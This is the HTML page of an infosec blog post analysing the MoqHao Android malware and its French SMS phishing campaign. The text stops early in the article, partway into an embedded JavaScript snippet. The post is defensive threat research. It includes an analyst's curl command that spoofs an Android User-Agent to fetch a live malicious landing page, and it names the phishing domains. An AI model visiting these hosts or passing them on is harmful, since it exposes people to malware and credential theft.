<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Technical analysis of the MoqHao (a.k.a RoamingMantis) Android malware and phishing campaign">
<title>MoqHao Android malware analysis and phishing campaign</title>

<link rel='canonical' href='https://www.xanhacks.xyz/p/moqhao-malware-analysis/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="MoqHao Android malware analysis and phishing campaign">
<meta property='og:description' content="Technical analysis of the MoqHao (a.k.a RoamingMantis) Android malware and phishing campaign">
<meta property='og:url' content='https://www.xanhacks.xyz/p/moqhao-malware-analysis/'>
<meta property='og:site_name' content='xanhacks&#39; infosec blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='malware' /><meta property='article:tag' content='reverse' /><meta property='article:tag' content='android' /><meta property='article:published_time' content='2022-08-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-08-11T00:00:00&#43;00:00'/><meta property='og:image' content='https://www.xanhacks.xyz/img/moqhao-malware-analysis/banner.png' />
<meta name="twitter:site" content="@xanhacks">
    <meta name="twitter:creator" content="@xanhacks"><meta name="twitter:title" content="MoqHao Android malware analysis and phishing campaign">
<meta name="twitter:description" content="Technical analysis of the MoqHao (a.k.a RoamingMantis) Android malware and phishing campaign"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://www.xanhacks.xyz/img/moqhao-malware-analysis/banner.png' />
    <link rel="shortcut icon" href="/img/favicon-32x32.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/icon_256px_hu16494215280536918364.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">â˜•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">xanhacks&#39; infosec blog</a></h1>
            <h2 class="site-description">xanhacks infosec blog, enjoy reading ðŸ“– !</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/xanhacks'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://gitlab.com/xanhacks'
                        target="_blank"
                        title="Gitlab"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-gitlab" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M21 14l-9 7l-9 -7l3 -11l3 7h6l3 -7z" />
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://app.hackthebox.com/profile/176254'
                        target="_blank"
                        title="HackTheBox"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-package" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <polyline points="12 3 20 7.5 20 16.5 12 21 4 16.5 4 7.5 12 3" />
  <line x1="12" y1="12" x2="20" y2="7.5" />
  <line x1="12" y1="12" x2="12" y2="21" />
  <line x1="12" y1="12" x2="4" y2="7.5" />
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://www.root-me.org/xanhacks'
                        target="_blank"
                        title="Root-Me"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="1000" height="1000" viewBox="0 0 1000 1000" xml:space="preserve">
<desc>Created with Fabric.js 3.5.0</desc>
<defs>
</defs>
<rect x="0" y="0" width="100%" height="100%" fill="rgba(255,255,255,0)"/>
<g transform="matrix(1.5279 0 0 1.5279 500.0048 500.0048)" id="576184">
<g style="" vector-effect="non-scaling-stroke">
		<g transform="matrix(1.8919 0 0 1.8919 -0.2835 154.75)" id="path5">
<path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; is-custom-font: none; font-file-url: none; fill: rgb(196,196,197); fill-rule: nonzero; opacity: 1;" transform=" translate(-296.95, -326.7)" d="m 299.2 319.9 c 0 0 0 0 0 0 c -0.1 -0.1 -0.2 -0.2 -0.2 -0.3 c -0.1 -0.1 -0.1 -0.1 -0.2 -0.2 c 0 0 0 0 0 0 c -0.1 0 -0.1 -0.1 -0.2 -0.1 c -0.1 -0.1 -0.2 -0.1 -0.3 -0.2 c -0.1 0 -0.2 -0.1 -0.3 -0.1 c -0.1 0 -0.2 -0.1 -0.2 -0.1 c -0.1 0 -0.2 0 -0.3 -0.1 c -0.1 0 -0.2 0 -0.3 0 c -0.1 0 -0.2 0 -0.3 0 c -0.1 0 -0.2 0 -0.3 0 c -0.1 0 -0.2 0 -0.3 0 c -0.1 0 -0.2 0 -0.3 0.1 c -0.1 0 -0.2 0.1 -0.2 0.1 c -0.1 0 -0.2 0.1 -0.3 0.1 c -0.1 0 -0.2 0.1 -0.3 0.2 c -0.1 0 -0.1 0.1 -0.2 0.1 c 0 0 0 0 0 0 c -0.1 0.1 -0.1 0.1 -0.2 0.2 c -0.1 0.1 -0.2 0.2 -0.2 0.2 c 0 0 0 0 0 0 l -8.1 10.1 c -1 1.3 -0.8 3.1 0.5 4.1 c 0.5 0.4 1.2 0.6 1.8 0.6 c 0.9 0 1.7 -0.4 2.3 -1.1 l 0.1 -0.1 c 3 -3.7 8.6 -3.7 11.5 0 l 0.1 0.1 c 0.6 0.7 1.4 1.1 2.3 1.1 c 0.6 0 1.3 -0.2 1.8 -0.6 c 1.3 -1 1.5 -2.9 0.5 -4.1 z" stroke-linecap="round"/>
</g>
		<g transform="matrix(1.8919 0 0 1.8919 -63.3781 -148.9055)" id="path7">
<path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; is-custom-font: none; font-file-url: none; fill: rgb(196,196,197); fill-rule: nonzero; opacity: 1;" transform=" translate(-263.601, -166.2)" d="m 285.7 149.1 c -4.1 0 -7.5 3.2 -7.7 7.3 l -15.3 5.6 c -0.8 0.3 -1.4 1 -1.4 1.9 v 9.7 H 249 c -0.9 -3.3 -3.8 -5.7 -7.4 -5.7 c -4.2 0 -7.7 3.4 -7.7 7.7 c 0 4.2 3.4 7.7 7.7 7.7 c 3.6 0 6.5 -2.4 7.4 -5.7 h 14.3 c 1.1 0 2 -0.9 2 -2 v -10.3 l 13.5 -5 c 1.3 2.5 3.9 4.2 6.8 4.2 c 4.2 0 7.7 -3.4 7.7 -7.7 c 0.1 -4.2 -3.4 -7.7 -7.6 -7.7 z" stroke-linecap="round"/>
</g>
		<g transform="matrix(1.8919 0 0 1.8919 -52.2172 90.0459)" id="path9">
<path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; is-custom-font: none; font-file-url: none; fill: rgb(235,235,235); fill-rule: nonzero; opacity: 1;" transform=" translate(-269.5, -292.5)" d="m 269.5 292.3 c -2.5 -0.9 -4.9 -1.8 -7.2 -2.8 c -1.7 -0.8 -3.4 -1.6 -5 -2.4 c 3.8 3.8 13 10.6 22.9 10.8 c 0.6 -0.7 1.1 -1.4 1.5 -2.3 c -1.5 -0.3 -3 -0.6 -4.5 -1 c -2.7 -0.7 -5.2 -1.4 -7.7 -2.3 z" stroke-linecap="round"/>
</g>
		<g transform="matrix(1.8919 0 0 1.8919 -0.5702 -0.6761)" id="path11">
<path style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-dashoffset: 0; stroke-linejoin: miter; stroke-miterlimit: 4; is-custom-font: none; font-file-url: none; fill: rgb(196,196,197); fill-rule: nonzero; opacity: 1;" transform=" translate(-296.8, -244.55)" d="m 395 222.5 c 0 -4.7 -0.3 -9.4 -1 -13.9 c 0 -0.3 -0.1 -0.6 -0.1 -0.9 c -6.1 -39.7 -36.2 -72.3 -75.8 -81 c -1 -4.5 -5 -7.9 -9.8 -7.9 c -5.6 0 -10.1 4.5 -10.1 10.1 c 0 4.8 3.4 8.8 7.9 9.8 v 36.9 c 0 0.6 0.3 1.2 0.8 1.6 c 0.3 0.2 0.7 0.3 1.1 0.3 c 0.2 0 0.5 0 0.7 -0.1 l 14.8 -5.6 c 1 1.5 2.5 2.5 4.3 3 v 17.4 c -7.5 9.2 -16.8 17.5 -26.7 24.9 l -11.3 -26.2 c 2.1 -1.4 3.5 -3.7 3.5 -6.4 c 0 -4.2 -3.4 -7.7 -7.7 -7.7 c -4.2 0 -7.7 3.4 -7.7 7.7 c 0 4.2 3.4 7.7 7.7 7.7 c 0.1 0 0.3 0 0.4 0 l 11.8 27.3 c -6.9 5 -14 9.5 -21 13.6 L 243.2 223 c -0.4 -0.1 -0.8 -0.1 -1.2 0.1 l -10 3.9 c -1.4 -1.9 -3.6 -3.1 -6.2 -3.1 c -4.2 0 -7.7 3.4 -7.7 7.7 c 0 4.2 3.4 7.7 7.7 7.7 c 4.2 0 7.7 -3.4 7.7 -7.7 c 0 -0.3 -0.1 -0.6 -0.1 -0.9 l 9.4 -3.7 l 29.3 8.8 c -25 14 -47.4 22.1 -51.1 23.4 l -1.8 0.6 c -1.6 -1.2 -3.6 -1.9 -5.8 -1.9 c -0.1 0 -0.2 0 -0.3 0 c -4.7 -11.1 -7.1 -23.2 -7.1 -35.3 c 0 -6 0.6 -11.9 1.7 -17.6 h 43.9 c 0.9 3.3 3.8 5.7 7.4 5.7 c 4.2 0 7.7 -3.4 7.7 -7.7 c 0 -4.2 -3.4 -7.7 -7.7 -7.7 c -3.6 0 -6.5 2.4 -7.4 5.7 h -43 c 8.1 -32.9 34.1 -59.2 67.7 -67 c 1.8 2.9 5 4.9 8.6 4.9 c 5.6 0 10.1 -4.5 10.1 -10.1 c 0 -5.6 -4.5 -10.1 -10.1 -10.1 c -4.9 0 -8.9 3.5 -9.9 8 c -44.1 10 -76.4 49.7 -76.4 95.7 c 0 13.1 2.6 26.2 7.7 38.2 c -1.9 1.8 -3 4.4 -3 7.2 c 0 4.5 2.9 8.2 6.9 9.6 v 39.4 c 0 0.7 0.2 1.4 0.6 2 l 2.2 1.5 l 29.9 21.1 v 25.2 c 0 2.1 1.7 3.8 3.8 3.8 h 100 c 2.1 0 3.8 -1.7 3.8 -3.8 v -25.2 l 30 -21.1 l 2.2 -1.6 c 0.4 -0.6 0.6 -1.3 0.6 -2 V 277 c 3.7 -1.5 6.3 -5.1 6.3 -9.3 c 0 -2.6 -1 -5 -2.6 -6.8 c 5.3 -11.9 8 -25.1 8 -38.4 z M 281.4 125.6 c 0.9 -1 2.2 -1.6 3.6 -1.6 c 2.7 0 4.9 2.2 4.9 4.9 c 0 2.7 -2.2 4.9 -4.9 4.9 c -1 0 -1.9 -0.3 -2.7 -0.8 c -1.3 -0.9 -2.2 -2.4 -2.2 -4 c 0 -1.4 0.5 -2.6 1.3 -3.4 z m 22 3.2 c 0 -2.7 2.2 -4.9 4.9 -4.9 c 1.4 0 2.6 0.6 3.5 1.5 c 0.8 0.9 1.3 2 1.3 3.3 c 0 1.6 -0.8 3.1 -2.1 4 c -0.8 0.6 -1.7 0.9 -2.8 0.9 c -2.6 0.1 -4.8 -2.1 -4.8 -4.8 z m 18.8 38.5 c 0 0.3 0.1 0.5 0.1 0.7 l -12.2 4.6 v -34 c 3 -0.5 5.5 -2.3 6.9 -4.8 c 10.7 2.4 20.7 6.7 29.6 12.6 c -0.1 14.8 -5.8 28.4 -14.8 40.7 v -12.4 c 3.3 -0.9 5.7 -3.8 5.7 -7.4 c 0 -4.2 -3.4 -7.7 -7.7 -7.7 c -4.2 0.1 -7.6 3.5 -7.6 7.7 z M 213.5 272.7 c -1.2 0 -2.3 -0.5 -3.2 -1.2 c -1 -0.9 -1.7 -2.2 -1.7 -3.6 c 0 -0.6 0.1 -1.2 0.3 -1.7 c 0.7 -1.8 2.5 -3.1 4.5 -3.1 c 0.9 0 1.7 0.3 2.4 0.7 c 1.4 0.8 2.4 2.4 2.4 4.2 c 0 0.9 -0.3 1.7 -0.7 2.4 c -0.7 1.4 -2.2 2.3 -4 2.3 z m 170 -1.9 c -0.9 1.1 -2.3 1.9 -3.8 1.9 c -1.4 0 -2.6 -0.6 -3.5 -1.5 c -0.8 -0.9 -1.3 -2 -1.3 -3.3 c 0 -2.1 1.3 -3.9 3.2 -4.5 c 0.5 -0.2 1.1 -0.3 1.7 -0.3 c 2.3 0 4.3 1.7 4.8 3.9 c 0.1 0.3 0.1 0.6 0.1 1 c -0.2 1 -0.6 2 -1.2 2.8 z m -3 -13 c -0.3 0 -0.6 0 -0.9 0 c -5.6 0 -10.1 4.5 -10.1 10.1 c 0 4.3 2.7 8 6.6 9.4 v 36.8 l -31.5 22.2 c -1 0.7 -1.6 1.9 -1.6 3.1 v 21.2 c 0 1.2 -1 2.2 -2.2 2.2 h -11.7 c -1.2 0 -2.2 -1 -2.2 -2.2 V 353 c 0 -2 -1.4 -3.8 -3.4 -4 c -2.3 -0.2 -4.2 1.6 -4.2 3.8 v 7.9 c 0 1.2 -1 2.2 -2.2 2.2 h -14.3 c -1.2 0 -2.2 -1 -2.2 -2.2 V 349 c 0 -2 -1.4 -3.8 -3.4 -4 c -2.3 -0.2 -4.2 1.6 -4.2 3.8 v 12 c 0 1.2 -1 2.2 -2.2 2.2 h -14.3 c -1.2 0 -2.2 -1 -2.2 -2.2 V 353 c 0 -2 -1.4 -3.8 -3.4 -4 c -2.3 -0.2 -4.2 1.6 -4.2 3.8 v 7.9 c 0 1.2 -1 2.2 -2.2 2.2 h -11.7 c -1.2 0 -2.2 -1 -2.2 -2.2 v -21.2 c 0 -1.2 -0.6 -2.4 -1.6 -3.1 L 217.6 314.2 V 277 c 3.5 -1.6 5.9 -5.1 5.9 -9.2 c 0 -0.6 -0.1 -1.2 -0.2 -1.8 c 4 -1.4 34.5 -12.3 64.5 -31 c 40.6 -25.3 63.1 -54 65.7 -83.5 c 17.5 14.1 29.6 34.5 33.1 57.4 c -0.5 50.1 -87.8 81 -88.7 81.3 c -0.2 0.1 -0.7 0.2 -1.1 0.4 c -1.1 -0.2 -2.2 -0.4 -3.4 -0.6 c -0.8 -0.2 -1.7 -0.3 -2.5 -0.5 c -1.3 -0.2 -2.6 -0.5 -3.9 -0.8 c -0.2 -0.1 -0.5 -0.1 -0.7 -0.1 c -0.5 -0.1 -1 -0.2 -1.5 -0.3 c -0.6 -0.1 -1.2 -0.3 -1.8 -0.4 c -1.4 -0.3 -2.8 -0.6 -4.1 -1 c -2.5 -0.6 -4.9 -1.3 -7.3 -1.9 c -2.3 -0.7 -4.7 -1.3 -6.9 -2 c -0.1 0 -0.1 0 -0.2 0 c -1.7 -0.5 -3.3 -1 -4.9 -1.6 c -0.5 -0.2 -1.1 -0.4 -1.6 -0.5 c -0.8 -0.3 -1.5 -0.5 -2.2 -0.7 c -1.3 -0.4 -2.5 -0.8 -3.6 -1.3 c 0 0 -0.1 0 -0.1 0 c -1.8 -0.6 -3.4 -1.2 -4.8 -1.8 c -1.5 -0.6 -2.8 -1.1 -3.8 -1.5 c -1 -0.5 -1.9 -0.8 -2.4 -1.1 c -0.6 -0.3 -0.9 -0.4 -0.9 -0.4 c 0 0 0.2 0.3 0.6 0.7 c 0.4 0.5 1 1.2 1.9 2 c 0.8 0.8 1.9 1.8 3.2 2.8 c 1.3 1 2.8 2.1 4.4 3.2 c 0 0 0 0 0.1 0 c -0.6 2 -1 4.2 -1 6.4 c 0 11.5 9.4 20.9 20.9 20.9 c 8.9 0 16.5 -5.6 19.5 -13.5 c 1 0.1 2.1 0.2 3.1 0.3 c 1.8 0.1 3.5 0.1 5.1 0.1 c 0.1 0 0.2 0.1 0.3 0.1 l 16.9 17.2 c 4.3 4.3 11 5 16 1.7 l 26.4 -14.8 c 2.3 -1.5 3.8 -4.1 3.8 -6.9 v -30.4 c 10.2 -8.1 19.4 -17.7 25.4 -28.6 c -1.1 7.9 -3.2 15.4 -6.3 22.5 z m -98.8 37.8 c -0.4 0.8 -1 1.6 -1.5 2.3 v 0 c -2.4 2.8 -6 4.6 -10 4.6 c -4 0 -7.6 -1.8 -10 -4.6 c -2 -2.3 -3.1 -5.3 -3.1 -8.5 c 0 -0.8 0.1 -1.5 0.2 -2.3 c 0 0 0 0 0 0 c 1.6 0.8 3.3 1.6 5 2.4 c 2.3 1 4.7 2 7.2 2.8 c 2.5 0.9 5.1 1.6 7.7 2.3 c 1.5 0.4 3 0.7 4.5 1 z" stroke-linecap="round"/>
</g>
</g>
</g>
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/xanhacks'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#tldr">TL;DR</a></li>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#smishing-campain">Smishing campain</a></li>
    <li><a href="#malware-analysis">Malware analysis</a>
      <ol>
        <li><a href="#overview-of-the-application">Overview of the application</a></li>
        <li><a href="#native-library-analysis">Native library analysis</a></li>
        <li><a href="#unpack-the-resource">Unpack the resource</a></li>
        <li><a href="#retrieve-c2-url">Retrieve C2 URL</a></li>
      </ol>
    </li>
    <li><a href="#iocs">IOCs</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/moqhao-malware-analysis/">
                
                    <img src="/img/moqhao-malware-analysis/banner.png" loading="lazy" alt="Featured image of post MoqHao Android malware analysis and phishing campaign" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/malware/" >
                Malware
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/moqhao-malware-analysis/">MoqHao Android malware analysis and phishing campaign</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Technical analysis of the MoqHao (a.k.a RoamingMantis) Android malware and phishing campaign
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Aug 11, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    19 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="analysis-of-moqhao-android-malware">Analysis of MoqHao Android malware
</h1><h2 id="tldr">TL;DR
</h2><p>The <strong>Roaming Mantis</strong> cyber threat actor is currently targeting France with an SMS phishing campaign in order to deliver a malicious Android application. This malware is named <strong>MoqHao</strong>, it contains its code in an encrypted and compressed resource. Once the resource is launched, MoqHao retrieves the IP address of its Command &amp; Control server by decrypting the &ldquo;About&rdquo; section of Imgur&rsquo;s profile.</p>
<blockquote>
<p>You can find samples and Python scripts on this <a class="link" href="https://github.com/xanhacks/MoqHao-malware"  target="_blank" rel="noopener"
    >Github repository</a>.</p>
</blockquote>
<h2 id="introduction">Introduction
</h2><p>Recently, both <a class="link" href="https://twitter.com/yarienkiva"  target="_blank" rel="noopener"
    >Alol</a> and I received multiple phishing SMS (or &ldquo;smishing&rdquo;) with the same pattern.
These SMS leads us to download malicious APK. Let&rsquo;s investigate!</p>
<h2 id="smishing-campain">Smishing campain
</h2><p>The smishing campaign has been targeting France for at least 1-2 months. The chain of infection is quite simple.</p>
<p>The victim clicks on the link in the SMS. Then, the site checks if the User-Agent is an Android/iPhone device and if the IP address comes from France (geofencing). If it is not the case, you receive a 404 not found. Otherwise, Android devices will be redirected to download a malicious APK and iPhone devices to a phishing website to steal iCloud credentials.</p>
<p>Example of phishing SMS :</p>
<p><img src="/img/moqhao-malware-analysis/sms.png"
	
	
	
	loading="lazy"
	
		alt="SMS"
	
	
></p>
<blockquote>
<p>EN : Your package has been sent. Please check it and receive it. hxxp://shbuf.bwdbu.com/</p>
</blockquote>
<p>In this article, we will focus on the Android malicious application, named MoqHao. It is automatically downloaded when we click on the link in the SMS thanks to following Javascript snippet :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">$ curl http://shbuf.bwdbu.com/ -A &#34;Mozilla/5.0 (Android 11; Mobile Firefox/83)&#34;
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">arr</span> <span class="o">=</span> <span 